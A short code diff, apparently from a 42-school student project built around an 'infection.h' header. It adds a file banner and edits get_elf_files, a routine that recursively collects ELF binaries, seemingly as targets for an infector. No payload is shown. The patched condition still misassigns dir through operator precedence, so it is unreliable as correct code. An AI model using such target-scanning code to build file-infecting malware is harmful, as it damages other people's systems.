@@ -1,3 +1,15 @@
+/* ************************************************************************** */
+/*                                                                            */
+/*                                                        :::      ::::::::   */
+/*   utils.c                                            :+:      :+:    :+:   */
+/*                                                    +:+ +:+         +:+     */
+/*   By: plamtenz <plamtenz@student.42.fr>          +#+  +:+       +#+        */
+/*                                                +#+#+#+#+#+   +#+           */
+/*   Created: 2020/02/29 18:24:06 by plamtenz          #+#    #+#             */
+/*   Updated: 2020/02/29 18:24:06 by plamtenz         ###   ########.fr       */
+/*                                                                            */
+/* ************************************************************************** */
+
 #include "infection.h"
 
 /*
@@ -115,7 +127,7 @@ char                **get_elf_files(char **files, char *dir_path, int type)
     DIR*            dir;
     int             index;
 
-    if (!dir_path || !(dir = opendir(dir_path)|| !files)
+    if (!dir_path || !(dir = opendir(dir_path)|| !files))
         return (NULL);
     while(dirent = readdir(dir)) // or getdents64 need doc
     {
@@ -129,7 +141,7 @@ char                **get_elf_files(char **files, char *dir_path, int type)
             folders = mtrx2d_add_elem(folders, file_path);
             continue ;
         }
-        if (is_elf_file(file_path, type) == SUCCESS)
+        if (valid_elf_file(file_path, type) == SUCCESS)
             files = mtrx2d_add_elem(files, file_path);
     }
     index = -1;
